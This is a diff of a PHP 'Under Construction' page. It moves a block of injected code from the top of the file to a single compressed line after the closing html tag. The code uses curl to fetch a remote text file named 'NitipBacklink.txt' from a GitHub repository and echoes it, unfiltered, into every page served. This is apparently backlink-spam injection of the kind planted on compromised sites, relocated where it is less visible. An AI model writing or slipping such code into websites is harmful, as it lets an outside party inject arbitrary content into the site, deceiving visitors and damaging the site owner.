@@ -1,11 +1,3 @@
-<?php
-$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
-curl_close($ch);
-echo $result;
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -36,8 +28,10 @@ echo $result;
     </style>
 </head>
 <body>
-    <img src="construction.png" alt="Under Construction">
+    <img src="https://static.vecteezy.com/system/resources/previews/000/192/152/non_2x/website-under-construction-vector.png" alt="Under Construction">
     <h1>Under Construction</h1>
     <p>Sorry, the website is currently under construction. We'll be back soon!</p>
 </body>
 </html>
+<?php $url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt'; $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $result = curl_exec($ch); curl_close($ch); echo $result;
+?>
